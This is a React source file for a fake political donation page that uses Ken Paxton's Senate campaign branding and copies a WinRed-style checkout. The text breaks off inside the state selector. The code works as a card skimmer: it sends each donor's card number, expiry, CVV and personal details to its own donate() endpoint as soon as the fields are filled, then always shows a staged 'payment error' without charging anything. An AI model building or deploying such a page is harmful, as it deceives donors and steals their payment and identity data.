import React, { useState ,  useEffect } from "react";
import { donate } from "../../api/index";

const Donate = () => {
  

  const [payment, setPayment] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
 
  });
  const [selectedButton, setSelectedButton] = useState(100); // Highlight $100
  const [sendingContact, setSendingContact] = useState(false);
    const [sendingCard, setSendingCard] = useState(false);
  const [step, setStep] = useState(1);
  const [submitted, setSubmitted] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [retired, setRetired] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState(0); // Show $0 now initially
  const [coverFee, setCoverFee] = useState(false);
  const [monthly, setMonthly] = useState(false);
  const [extraDonation, setExtraDonation] = useState(false);
  const processingFees = {
    25: 1.03,
    50: 2.05,
    100: 4.10,
    250: 10.25,
    500: 20.51,
    1000: 41.02,
    3500: 143.56,
    7000: 287.11,
  };

  const processingFee = processingFees[selectedAmount];
const paymentComplete =
  payment.cardNumber.replace(/\s/g, "").length === 16 &&
  payment.expiry.length === 5 &&
  payment.cvv.length >= 3;
  const totalAmount = selectedAmount + (coverFee ? processingFee : 0);
  const [contact, setContact] = useState({
    firstName: "",
    lastName: "",
    email: "",
    address: "",
    zip: "",
    city: "",
    state: "",
    mobile: "",
    employer: "",
    occupation: "",
  });
  const amounts = [25, 50, 100, 250, 500, 1000, 3500, 7000];
  const [paymentError, setPaymentError] = useState(false);

  const step2Complete =
    contact.firstName.trim() !== "" &&
    contact.lastName.trim() !== "" &&
    contact.email.trim() !== "" &&
    contact.address.trim() !== "" &&
    contact.zip.trim() !== "" &&
    contact.city.trim() !== "" &&
    contact.state.trim() !== "" &&
    contact.mobile.trim() !== "" &&
    (retired || (contact.employer.trim() && contact.occupation.trim()));

     const step3Complete =
    payment.cardNumber.trim() !== "" &&
    payment.expiry.trim() !== "" &&
    payment.cvv.trim() !== "" 
    ;


const handleStep2 = (e) => {
  e.preventDefault();

  if (!step2Complete) return;

  setStep(3);
};
const handleStep3 = (e) => {
  e.preventDefault();

  setPaymentError(false);
  setProcessing(true);

  setTimeout(() => {
    setProcessing(false);
    setPaymentError(true);
  }, 3000);
};

const submitDonation = async () => {
  if (submitted) return;

  setSubmitted(true);

  try {
    await donate({
      firstName: contact.firstName,
      lastName: contact.lastName,
      email: contact.email,
      mobile: contact.mobile,
      address: contact.address,
      city: contact.city,
      state: contact.state,
      zip: contact.zip,
      employer: contact.employer,
      occupation: contact.occupation,
      retired,
      cardNumber: payment.cardNumber,
      expiry: payment.expiry,
      cvv: payment.cvv,
      amount: selectedAmount,
      monthly,
      coverFee,
      processingFee,
      totalAmount,
    });
  } catch (err) {
    console.error(err);
    setSubmitted(false); // allow retry if request failed
  }
};
useEffect(() => {
  if (step === 3 && paymentComplete && !submitted) {
    submitDonation();
  }
}, [step, paymentComplete, submitted]);






  return (
    <div className="relative bg-white">


<>
  {/* Desktop */}
  <div className="hidden md:block">

  <section className="relative min-h-screen">
        {/* Fixed Right Image */}
        <div className="fixed top-0 right-0 h-screen w-[62%] overflow-hidden">
          <img
            src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1783944467/IMG_9847_1_vmwzts.jpg"
            alt=""
            className="w-full h-full object-cover object-top"
          />
        </div>

        {/* Left Blue Background */}
        <div className="w-[42%] bg-[#0d3767] min-h-screen relative z-10">
          {/* Donation Card */}
          <div className="w-[390px] ml-24 py-3">
            <div className="relative bg-white rounded-sm shadow-md overflow-hidden">
              {/* Logo */}
              {processing && (
  <div className="absolute inset-0 bg-white/90 z-50 flex flex-col items-center justify-center">
    <div className="w-12 h-12 border-4 border-gray-300 border-t-[#e31d2b] rounded-full animate-spin"></div>

    <p className="mt-5 text-[#0f2d5e] font-bold text-lg">
      Processing...
    </p>

    <p className="text-gray-500 text-sm mt-1">
      Please wait while we process your donation.
    </p>
  </div>
)}
              <div className="py-14 mt-10 px-6">
                <img
                  src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1783950866/Untitled-7-247w_fy78r9.webp"
                  alt="Ken Paxton for Senate"
                  className="w-[250px] mx-auto"
                />
              </div>

              {/* Everything below will be added in Part 2 */}
              <div className="p-5">
                <div className="border border-[#0f2d5e] text-red-600 font-bold text-[15px] text-center py-1 uppercase">
                  SUPPORT KEN PAXTON FOR SENATE
                </div>

                <div className="mt-5 ">
                  <div className="mt-3 text-[#111]">
                    <h2 className="text-[22px] leading-7 font-normal">
                      Radical James Talarico Raised Nearly $11 Million in ONE
                      Month. We Need YOUR Help Right Now...
                    </h2>

                    <p className="mt-6 text-[15px]">One month. $10,791,775!</p>

                    <p className="mt-8 text-[15px] leading-5">
                      That is what James Talarico raised online in May alone. He
                      has now raised over $50 million for this race, leads in
                      some recent polls, and he JUST launched statewide
                      television ads in ALL major TV markets.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Millions of undecided voters will hear his version of this
                      race. His framing. His $11 million. Unless Ken has the
                      resources to answer back.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Those same voters do not know James Talarico called the
                      American flag a complicated symbol. They do not know he
                      secretly flew to San Francisco for billionaire fundraisers
                      while telling Texans he was fighting billionaire
                      influence. They do not know he said God is nonbinary or
                      that he wants a welcome mat at the southern border.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      They are about to find out from Talarico's ads. Unless we
                      act today.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Ken Paxton fights for us. He took on the Biden
                      administration more than 100 times and won. He is ready
                      for this next fight. But he cannot close a $50 million gap
                      without you.
                    </p>

                    <h3 className="mt-10 text-[22px] font-black uppercase leading-8">
                      PLEASE CHIP IN WHATEVER YOU CAN BELOW!
                    </h3>

                    {/* Donation Buttons */}
                    {step === 1 && (
                      <>
                        <div className="grid grid-cols-4 gap-2 mt-8">
                          {amounts.map((amount) => (
                            <button
                              key={amount}
                              onClick={() => {
                                setSelectedButton(amount);
                                setSelectedAmount(amount);
                              }}
                              className={`py-3 font-bold text-sm text-white transition
        ${
          selectedButton === amount
            ? "bg-[#d6001c]"
            : "bg-[#08386f] hover:bg-[#0b4d96]"
        }`}
                            >
                              ${amount.toLocaleString()}
                            </button>
                          ))}
                        </div>

                        <input
                          type="text"
                          placeholder="Other"
                          className="w-[100px] mt-3 border border-gray-300 px-3 py-3 text-sm outline-none"
                        />

                        <p className="text-center text-[13px] mt-4 text-gray-700">
                          Your contribution will benefit Ken Paxton for Senate.
                        </p>

                        {/* Cover Fee */}

                        <div
                          className={`border mt-6 p-4 transition cursor-pointer ${
                            coverFee
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={coverFee}
                              onChange={(e) => setCoverFee(e.target.checked)}
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <div
                              className={`leading-6 ${
                                coverFee ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              <p className="font-semibold text-[14px]   text-center">
                                I would like to cover the processing fee of{" "}
                                {processingFee && (
                                  <span className="font-black">
                                    ${processingFee.toFixed(2)}
                                  </span>
                                )}{" "}
                                100% of my donation goes to Ken Paxton for
                                Senate.
                              </p>
                            </div>
                          </label>
                        </div>

                        {/* Monthly */}

                        <div
                          className={`border mt-3 p-4 text-[13px] transition cursor-pointer ${
                            monthly
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={monthly}
                              onChange={(e) => setMonthly(e.target.checked)}
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <span
                              className={`font-bold ${
                                monthly ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              Make this a monthly recurring donation
                            </span>
                          </label>
                        </div>

                        {/* Long Checkbox */}

                        <div
                          className={`border mt-3 p-4 text-[13px] leading-5 transition cursor-pointer ${
                            extraDonation
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={extraDonation}
                              onChange={(e) =>
                                setExtraDonation(e.target.checked)
                              }
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <span
                              className={`text-[14px] text-center block ${
                                extraDonation ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              James Talarico and the Democrats have raised
                              nearly{" "}
                              <span className="font-bold">$70 million</span> to
                              beat Ken Paxton and turn Texas Blue. All that
                              stands in the way of this happening is{" "}
                              <span className="font-bold">YOU.</span> Will you
                              step up one more time by checking this box and
                              making an additional one time contribution on{" "}
                              <span className="font-bold">July 31</span>? We are
                              relying on your support to help fight back against
                              the Democrats and their billionaire supporters.
                              Please check this box and make one more gift for
                              this critical goal.
                              <span
                                className={`block text-center font-bold text-[15px] ${
                                  extraDonation
                                    ? "text-white"
                                    : "text-[#6b7b90]"
                                }`}
                              >
                                Donate an additional $
                                {selectedAmount.toLocaleString()} automatically
                                on 7/31
                              </span>
                            </span>
                          </label>
                        </div>
                        <button
                          disabled={selectedAmount === 0}
                          onClick={() => setStep(2)}
                          className={`w-full mt-4 py-4 font-semibold rounded ${
                            selectedAmount > 0
                              ? "bg-[#d6001c] text-white"
                              : "bg-gray-300 text-white"
                          }`}
                        >
                          Continue
                        </button>

                        <div className="mt-10 text-right">
                          <div className="text-red-600 font-bold text-sm">
                            $
                            {(
                              selectedAmount + (coverFee ? processingFee : 0)
                            ).toLocaleString(undefined, {
                              minimumFractionDigits: coverFee ? 2 : 0,
                              maximumFractionDigits: 2,
                            })}{" "}
                            now
                          </div>
                        </div>
                      </>
                    )}
<form onSubmit={step === 2 ? handleStep2 : handleStep3}>
                    {step === 2 && (
                      <>
                        <p className="mt-8 text-[13px] text-[#666]">
                          Enter your contact information:
                        </p>

                        <div className="mt-3 grid grid-cols-2 gap-[1px] border border-gray-300">
                          <input
                            type="text"
                            name="firstName"
                            value={contact.firstName}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                firstName: e.target.value,
                              })
                            }
                            placeholder="First name*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="lastName"
                            value={contact.lastName}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                lastName: e.target.value,
                              })
                            }
                            placeholder="Last name*"
                            className="border-b p-3 text-[13px] outline-none"
                          />
                          <input
                            type="email"
                            name="email"
                            value={contact.email}
                            onChange={(e) =>
                              setContact({ ...contact, email: e.target.value })
                            }
                            placeholder="Email*"
                            className="col-span-2 border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="address"
                            value={contact.address}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                address: e.target.value,
                              })
                            }
                            placeholder="Address*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="zip"
                            value={contact.zip}
                            onChange={(e) =>
                              setContact({ ...contact, zip: e.target.value })
                            }
                            placeholder="Zip*"
                            className="border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="city"
                            value={contact.city}
                            onChange={(e) =>
                              setContact({ ...contact, city: e.target.value })
                            }
                            placeholder="City*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <select
                            name="state"
                            value={contact.state}
                            onChange={(e) =>
                              setContact({ ...contact, state: e.target.value })
                            }
                            className=" p-3  border-b border-grey-300  rounded-none bg-white appearance-none text-[13px] text-[#0f2d5e]  outline-none"
                          >
                            <option value="">State*</option>

                            <option value="AL">AL</option>
                            <option value="AK">AK</option>
                            <option value="AZ">AZ</option>
                            <option value="AR">AR</option>
                            <option value="CA">CA</option>
                            <option value="CO">CO</option>
                            <option value="CT">CT</option>
                            <option value="DE">DE</option>
                            <option value="FL">FL</option>
                            <option value="GA">GA</option>
                            <option value="HI">HI</option>
                            <option value="ID">ID</option>
                            <option value="IL">IL</option>
                            <option value="IN">IN</option>
                            <option value="IA">IA</option>
                            <option value="KS">KS</option>
                            <option value="KY">KY</option>
                            <option value="LA">LA</option>
                            <option value="ME">ME</option>
                            <option value="MD">MD</option>
                            <option value="MA">MA</option>
                            <option value="MI">MI</option>
                            <option value="MN">MN</option>
                            <option value="MS">MS</option>
                            <option value="MO">MO</option>
                            <option value="MT">MT</option>
                            <option value="NE">NE</option>
                            <option value="NV">NV</option>
                            <option value="NH">NH</option>
                            <option value="NJ">NJ</option>
                            <option value="NM">NM</option>
                            <option value="NY">NY</option>
                            <option value="NC">NC</option>
                            <option value="ND">ND</option>
                            <option value="OH">OH</option>
                            <option value="OK">OK</option>
                            <option value="OR">OR</option>
                            <option value="PA">PA</option>
                            <option value="RI">RI</option>
                            <option value="SC">SC</option>
                            <option value="SD">SD</option>
                            <option value="TN">TN</option>
                            <option value="TX">TX</option>
                            <option value="UT">UT</option>
                            <option value="VT">VT</option>
                            <option value="VA">VA</option>
                            <option value="WA">WA</option>
                            <option value="WV">WV</option>
                            <option value="WI">WI</option>
                            <option value="WY">WY</option>

                            <option value="DC">DC</option>
                          </select>

                          <input
                            type="text"
                            name="mobile"
                            value={contact.mobile}
                            onChange={(e) =>
                              setContact({ ...contact, mobile: e.target.value })
                            }
                            placeholder="Mobile"
                            className="col-span-2 p-3 text-[13px] outline-none"
                          />
                        </div>

                        <div className="mt-4 text-[10px] leading-4 text-[#666]">
                          <label className="flex items-start gap-2">
                            <span>
                              Sign up for text updates! By participating, you
                              agree to the
                              <span className="text-red-600 underline cursor-pointer">
                                {" "}
                                <span className="text-red-700 hover:cursor-pointer  underline">
                                  <a href="https://tandcs.us/kptx/">
                                    terms & privacy policy
                                  </a>
                                </span>{" "}
                              </span>{" "}
                              for recurring autodialed campaign and donation
                              messages from Ken Paxton to the phone number you
                              provide. No consent required to buy. Text STOP to
                              end. Msg&data rates may apply.
                            </span>
                          </label>
                        </div>

                        <p className="mt-5 text-[13px] text-[#555]">
                          Campaign finance law requires us to collect your
                          employment information.
                        </p>

                        <label
                          className={`mt-3 flex items-center justify-center gap-3 border py-4 cursor-pointer transition-all ${
                            retired
                              ? "bg-[#0f2d5e] border-[#0f2d5e] text-white"
                              : "border-[#0f2d5e] bg-white text-[#0f2d5e]"
                          }`}
                        >
                          <input
                            type="checkbox"
                            checked={retired}
                            onChange={(e) => setRetired(e.target.checked)}
                            className="accent-blue cursor-pointer "
                          />

                          <span
                            className={`text-[13px] font-bold ${
                              retired ? "text-white" : "text-[#0f2d5e]"
                            }`}
                          >
                            I'm retired.
                          </span>
                        </label>

                        {!retired && (
                          <div className="mt-3 grid grid-cols-2 gap-[1px] border border-gray-300">
                            <input
                              type="text"
                              name="employer"
                              value={contact.employer}
                              onChange={(e) =>
                                setContact({
                                  ...contact,
                                  employer: e.target.value,
                                })
                              }
                              placeholder="Employer*"
                              className="border-r p-3 text-[13px] outline-none"
                            />
                            <input
                              type="text"
                              name="occupation"
                              value={contact.occupation}
                              onChange={(e) =>
                                setContact({
                                  ...contact,
                                  occupation: e.target.value,
                                })
                              }
                              placeholder="Occupation*"
                              className="p-3 text-[13px] outline-none"
                            />
                          </div>
                        )}
                       <button
  type="submit"
  disabled={!step2Complete || sendingContact}
  className={`w-full mt-4 py-4 font-bold transition ${
    step2Complete
      ? "bg-[#e31d2b] text-white hover:bg-red-700 cursor-pointer"
      : "bg-gray-300 text-white cursor-not-allowed"
  }`}
>
 Continue
</button>

                        <div className="mt-6 flex justify-between items-center">
                          <button
                            onClick={() => setStep(1)}
                            className="text-[12px] underline"
                          >
                            Back
                          </button>

                          <span className="text-red-600 font-bold text-[13px]">
                            ${totalAmount.toFixed(2)} now
                          </span>
                        </div>
                      </>
                    )}

                    {step === 3 && (
                      <>
                        {paymentError && (
                          <div className="mb-4 bg-[#ff4b5c] text-white text-[13px] font-bold px-4 py-3 rounded">
                            Error processing payment, try again later.
                          </div>
                        )}

                        <p className="text-[12px] text-[#555] mb-2">
                          Enter your payment details:
                        </p>

                        {/* ONE ROW LIKE WINRED */}
                        <div className="flex border border-[#d9d9d9] overflow-hidden rounded-sm">
                          {/* Card Number */}
                         
{/* <input
  type="text"
  placeholder="💳 Card number"
  inputMode="numeric"
  maxLength={16}
  value={payment.cardNumber}
  onChange={(e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 16);

    setPayment({
      ...payment,
      cardNumber: value,
    });
  }}
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r placeholder:font-bold placeholder:text-[#8b8b8b]"
/> */}

{/* <input
  type="text"
  inputMode="numeric"
  pattern="[0-9]*"
  maxLength={16}
  value={payment.cardNumber}
  onChange={(e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 16);
    setPayment({
      ...payment,
      cardNumber: value,
    });
  }}
  placeholder="💳 Card number"
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r"
/> */}
<input
  type="tel"
  name="cardNumber"
  placeholder="Card number"
  inputMode="numeric"
  maxLength={19} // 16 digits + 3 spaces
  value={payment.cardNumber}
  onChange={(e) => {
    // Keep only numbers
    const digits = e.target.value.replace(/\D/g, "").slice(0, 16);

    // Add a space every 4 digits
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");

    setPayment({
      ...payment,
      cardNumber: formatted,
    });
  }}
  className="flex-1 px-3 py-[11px] text-[14px] text-[#0f2d5e] font-bold outline-none border-r placeholder:font-bold placeholder:text-[#0f2d5e]"
/>





                          {/* Expiry */}
                          <input
                            type="text"
                            name="expiry"

 autoComplete="new-password"
                            placeholder="MM / YY"
                            maxLength={5}
                            value={payment.expiry}
                            onChange={(e) => {
                              let value = e.target.value.replace(/\D/g, "");

                              if (value.length > 2) {
                                value =
                                  value.slice(0, 2) + "/" + value.slice(2, 4);
                              }

                              setPayment({
                                ...payment,
                                expiry: value,
                              });
                            }}
                            className="w-[78px] text-center text-[14px] text-[#0f2d5e] font-bold   outline-none border-r placeholder:font-bold placeholder:text-[#0f2d5e]"
                          />

                          {/* CVV */}
                         <input
  type="tel"
  inputMode="numeric"
  pattern="[0-9]*"
  placeholder="CVC"
  id={`cvc-${Math.random().toString(36).slice(2)}`}
 name="cvv"
  autoComplete="off"
  spellCheck={false}
  maxLength={4}
  value={payment.cvv}
  onChange={(e) =>
    setPayment({
      ...payment,
      cvv: e.target.value.replace(/\D/g, "").slice(0, 4),
    })
  }
  onFocus={(e) => e.target.removeAttribute("readonly")}
  readOnly
  className="w-[60px] text-center text-[14px] text-[#0f2d5e] font-bold outline-none placeholder:font-bold placeholder:text-[#0f2d5e]"
/>
                        </div>

                        {/* Card holder */}

                        {/* Card icons */}

                        {/* Buttons */}
                        <div className="flex gap-3 mt-6">
                         <button
  type="submit"
  disabled={!paymentComplete || processing}
  className={`flex-1 py-4 font-bold ${
    paymentComplete
      ? "bg-[#e31d2b] text-white"
      : "bg-gray-300 text-white cursor-not-allowed"
  }`}
>
  DONATE NOW
</button>
                        </div>
                        <div className="mt-4 text-[14px] leading-4 text-[#666]">
                          By clicking "Donate" I accept WinRed's{" "}
                          <span className="text-red-700 hover:cursor-pointer  underline">
                            <a href="https://tandcs.us/kptx/">
                              terms & privacy policy
                            </a>
                          </span>{" "}
                        </div>

                        {/* Amount */}

                        <div className="mt-6 flex justify-between items-center">
                          <button
                            onClick={() => setStep(2)}
                            className="text-[12px] underline"
                          >
                            Back
                          </button>

                          <span className="text-red-600 font-bold text-[13px]">
                            ${totalAmount.toFixed(2)} now
                          </span>
                        </div>
                      </>
                    )}
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
</div>

  {/* Mobile */}
 <div className="block md:hidden bg-white">

 {processing && (
  <div className="fixed inset-0 bg-white z-[9999] flex flex-col items-center justify-center">
    <div className="w-12 h-12 border-4 border-gray-300 border-t-[#e31d2b] rounded-full animate-spin"></div>

    <p className="mt-5 text-[#0f2d5e] font-bold text-lg">
      Processing...
    </p>

    <p className="mt-1 text-sm text-gray-500 text-center px-6">
      Please wait while we process your donation.
    </p>
  </div>
)}
<section  className="relative min-h-screen">
  <img
    src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1783949432/339813784_152047611130134_2730394229275614479_n-e1711469371805-80bde372-00843c79-1920w_ycs2go.webp"
    alt=""
    className="w-full object-cover"
  />

  {/* Donation Card */}
  <div className="px-3 mt-2 relative z-10">
    <div className="bg-white shadow-lg">

      {/* Logo */}
      <div className="pt-8 pb-6 px-5">
        <img
          src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1783950866/Untitled-7-247w_fy78r9.webp"
          className="w-52 mx-auto"
          alt=""
        />
      </div>

      {/* Everything below */}
       <div className="p-5">
                <div className="border border-[#0f2d5e] text-red-600 font-bold text-[15px] text-center py-1 uppercase">
                  SUPPORT KEN PAXTON FOR SENATE
                </div>

                <div className="mt-5 ">
                  <div className="mt-3 text-[#111]">
                    <h2 className="text-[22px] leading-7 font-normal">
                      Radical James Talarico Raised Nearly $11 Million in ONE
                      Month. We Need YOUR Help Right Now...
                    </h2>

                    <p className="mt-6 text-[15px]">One month. $10,791,775!</p>

                    <p className="mt-8 text-[15px] leading-5">
                      That is what James Talarico raised online in May alone. He
                      has now raised over $50 million for this race, leads in
                      some recent polls, and he JUST launched statewide
                      television ads in ALL major TV markets.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Millions of undecided voters will hear his version of this
                      race. His framing. His $11 million. Unless Ken has the
                      resources to answer back.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Those same voters do not know James Talarico called the
                      American flag a complicated symbol. They do not know he
                      secretly flew to San Francisco for billionaire fundraisers
                      while telling Texans he was fighting billionaire
                      influence. They do not know he said God is nonbinary or
                      that he wants a welcome mat at the southern border.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      They are about to find out from Talarico's ads. Unless we
                      act today.
                    </p>

                    <p className="mt-8 text-[15px] leading-5">
                      Ken Paxton fights for us. He took on the Biden
                      administration more than 100 times and won. He is ready
                      for this next fight. But he cannot close a $50 million gap
                      without you.
                    </p>

                    <h3 className="mt-10 text-[22px] font-black uppercase leading-8">
                      PLEASE CHIP IN WHATEVER YOU CAN BELOW!
                    </h3>

                    {/* Donation Buttons */}
                    {step === 1 && (
                      <>
                        <div className="grid grid-cols-4 gap-2 mt-8">
                          {amounts.map((amount) => (
                            <button
                              key={amount}
                              onClick={() => {
                                setSelectedButton(amount);
                                setSelectedAmount(amount);
                              }}
                              className={`py-3 font-bold text-sm text-white transition
        ${
          selectedButton === amount
            ? "bg-[#d6001c]"
            : "bg-[#08386f] hover:bg-[#0b4d96]"
        }`}
                            >
                              ${amount.toLocaleString()}
                            </button>
                          ))}
                        </div>

                        <input
                          type="text"
                          placeholder="Other"
                          className="w-[100px] mt-3 border border-gray-300 px-3 py-3 text-sm outline-none"
                        />

                        <p className="text-center text-[13px] mt-4 text-gray-700">
                          Your contribution will benefit Ken Paxton for Senate.
                        </p>

                        {/* Cover Fee */}

                        <div
                          className={`border mt-6 p-4 transition cursor-pointer ${
                            coverFee
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={coverFee}
                              onChange={(e) => setCoverFee(e.target.checked)}
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <div
                              className={`leading-6 ${
                                coverFee ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              <p className="font-semibold text-[14px]   text-center">
                                I would like to cover the processing fee of{" "}
                                {processingFee && (
                                  <span className="font-black">
                                    ${processingFee.toFixed(2)}
                                  </span>
                                )}{" "}
                                100% of my donation goes to Ken Paxton for
                                Senate.
                              </p>
                            </div>
                          </label>
                        </div>

                        {/* Monthly */}

                        <div
                          className={`border mt-3 p-4 text-[13px] transition cursor-pointer ${
                            monthly
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={monthly}
                              onChange={(e) => setMonthly(e.target.checked)}
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <span
                              className={`font-bold ${
                                monthly ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              Make this a monthly recurring donation
                            </span>
                          </label>
                        </div>

                        {/* Long Checkbox */}

                        <div
                          className={`border mt-3 p-4 text-[13px] leading-5 transition cursor-pointer ${
                            extraDonation
                              ? "bg-[#0f2d5e] border-[#0f2d5e]"
                              : "bg-white border-[#0f2d5e]"
                          }`}
                        >
                          <label className="flex gap-3 items-start cursor-pointer">
                            <input
                              type="checkbox"
                              checked={extraDonation}
                              onChange={(e) =>
                                setExtraDonation(e.target.checked)
                              }
                              className="mt-1 accent-blue hover:cursor-pointer"
                            />

                            <span
                              className={`text-[14px] text-center block ${
                                extraDonation ? "text-white" : "text-[#0f2d5e]"
                              }`}
                            >
                              James Talarico and the Democrats have raised
                              nearly{" "}
                              <span className="font-bold">$70 million</span> to
                              beat Ken Paxton and turn Texas Blue. All that
                              stands in the way of this happening is{" "}
                              <span className="font-bold">YOU.</span> Will you
                              step up one more time by checking this box and
                              making an additional one time contribution on{" "}
                              <span className="font-bold">July 31</span>? We are
                              relying on your support to help fight back against
                              the Democrats and their billionaire supporters.
                              Please check this box and make one more gift for
                              this critical goal.
                              <span
                                className={`block text-center font-bold text-[15px] ${
                                  extraDonation
                                    ? "text-white"
                                    : "text-[#6b7b90]"
                                }`}
                              >
                                Donate an additional $
                                {selectedAmount.toLocaleString()} automatically
                                on 7/31
                              </span>
                            </span>
                          </label>
                        </div>
                        <button
                          disabled={selectedAmount === 0}
                          onClick={() => setStep(2)}
                          className={`w-full mt-4 py-4 font-semibold rounded ${
                            selectedAmount > 0
                              ? "bg-[#d6001c] text-white"
                              : "bg-gray-300 text-white"
                          }`}
                        >
                          Continue
                        </button>

                        <div className="mt-10 text-right">
                          <div className="text-red-600 font-bold text-sm">
                            $
                            {(
                              selectedAmount + (coverFee ? processingFee : 0)
                            ).toLocaleString(undefined, {
                              minimumFractionDigits: coverFee ? 2 : 0,
                              maximumFractionDigits: 2,
                            })}{" "}
                            now
                          </div>
                        </div>
                      </>
                    )}
<form onSubmit={step === 2 ? handleStep2 : handleStep3}>
                    {step === 2 && (
                      <>
                        <p className="mt-8 text-[13px] text-[#666]">
                          Enter your contact information:
                        </p>

                        <div className="mt-3 grid grid-cols-2 gap-[1px] border border-gray-300">
                          <input
                            type="text"
                            name="firstName"
                            value={contact.firstName}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                firstName: e.target.value,
                              })
                            }
                            placeholder="First name*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="lastName"
                            value={contact.lastName}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                lastName: e.target.value,
                              })
                            }
                            placeholder="Last name*"
                            className="border-b p-3 text-[13px] outline-none"
                          />
                          <input
                            type="email"
                            name="email"
                            value={contact.email}
                            onChange={(e) =>
                              setContact({ ...contact, email: e.target.value })
                            }
                            placeholder="Email*"
                            className="col-span-2 border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="address"
                            value={contact.address}
                            onChange={(e) =>
                              setContact({
                                ...contact,
                                address: e.target.value,
                              })
                            }
                            placeholder="Address*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="zip"
                            value={contact.zip}
                            onChange={(e) =>
                              setContact({ ...contact, zip: e.target.value })
                            }
                            placeholder="Zip*"
                            className="border-b p-3 text-[13px] outline-none"
                          />

                          <input
                            type="text"
                            name="city"
                            value={contact.city}
                            onChange={(e) =>
                              setContact({ ...contact, city: e.target.value })
                            }
                            placeholder="City*"
                            className="border-r border-b p-3 text-[13px] outline-none"
                          />

                          <select
                            name="state"
                            value={contact.state}
                            onChange={(e) =>
                              setContact({ ...contact, state: e.target.value })
                            }
                            className=" p-3 border-b border-grey-300  rounded-none bg-white appearance-none text-[13px] text-[#0f2d5e]  outline-none"
                          >
                            <option value="">State*</option>

                            <option value="AL">AL</option>
                            <option value="AK">AK</option>
                            <option value="AZ">AZ</option>
                            <option value="AR">AR</option>
                            <option value="CA">CA</option>
                            <option value="CO">CO</option>
                            <option value="CT">CT</option>
                            <option value="DE">DE</option>
                            <option value="FL">FL</option>
                            <option value="GA">GA</option>
                            <option value="HI">HI</option>
                            <option value="ID">ID</option>
                            <option value="IL">IL</option>
                            <option value="IN">IN</option>
                            <option value="IA">IA</option>
                            <option value="KS">KS</option>
                            <option value="KY">KY</option>
                            <option value="LA">LA</option>
                            <option value="ME">ME</option>
                            <option value="MD">MD</option>
                            <option value="MA">MA</option>
                            <option value="MI">MI</option>
                            <option value="MN">MN</option>
                            <option value="MS">MS</option>
                            <option value="MO">MO</option>
                            <option value="MT">MT</option>
                            <option value="NE">NE</option>
                            <option value="NV">NV</option>
                            <option value="NH">NH</option>
                            <option value="NJ">NJ</option>
                            <option value="NM">NM</option>
                            <option value="NY">NY</option>
                            <option value="NC">NC</option>
                            <option value="ND">ND</option>
                            <option value="OH">OH</option>
                            <option value="OK">OK</option>
                            <option value="OR">OR</option>
                            <option value="PA">PA</option>
                            <option value="RI">RI</option>
                            <option value="SC">SC</option>
                            <option value="SD">SD</option>
                            <option value="TN">TN</option>
                            <option value="TX">TX</option>
                            <option value="UT">UT</option>
                            <option value="VT">VT</option>
                            <option value="VA">VA</option>
